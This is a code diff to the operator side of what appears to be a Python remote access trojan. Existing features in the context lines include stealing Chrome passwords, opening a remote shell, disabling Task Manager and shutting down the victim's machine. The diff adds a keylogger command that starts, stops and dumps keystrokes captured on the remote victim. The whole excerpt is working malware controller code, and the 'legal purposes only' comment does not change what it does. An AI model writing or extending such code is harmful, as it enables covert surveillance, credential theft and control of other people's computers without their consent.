@@ -388,6 +388,27 @@ def chrpass():  # legal purposes only!
     print("\n" + decode_utf8(recvall(intBuffer)))  # print results
 
 
+def keylogger(option):
+    if option == "start":
+        conn.send(str.encode("keystart"))
+        if decode_utf8(conn.recv(1024)) == "error":
+            print("Keylogger currently unavailable.")
+
+    elif option == "stop":
+        conn.send(str.encode("keystop"))
+
+    elif option == "dump":
+        conn.send(str.encode("keydump"))
+        intBuffer = decode_utf8(conn.recv(1024))
+
+        if intBuffer == "error":
+            print("Keylogger is not running!")
+            return
+
+        strLogs = decode_utf8(recvall(int(intBuffer)))  # get all data
+        print("\n" + strLogs)
+
+
 def show_help():
     print("--help")
     print("--m Send message")
@@ -401,6 +422,7 @@ def show_help():
     print("--u User Info")
     print("--e Open remote cmd")
     print("--d Disable task manager")
+    print("--k (start) (stop) (dump) Keylogger")
     print("--x (1) Lock user")
     print("--x (2) Restart user")
     print("--x (3) Shutdown user")
@@ -454,8 +476,14 @@ def send_commands():
                 disable_taskmgr()
             elif strChoice == "--g":
                 chrpass()
+            elif strChoice == "--k start":
+                keylogger("start")
+            elif strChoice == "--k stop":
+                keylogger("stop")
+            elif strChoice == "--k dump":
+                keylogger("dump")
             else:
-                print("Invalid choice, please try again!" + "\n")
+                print("Invalid choice, please try again!")
 
     except socket.error:  # if there is a socket error
         print("Error, connection was lost!" + "\n")
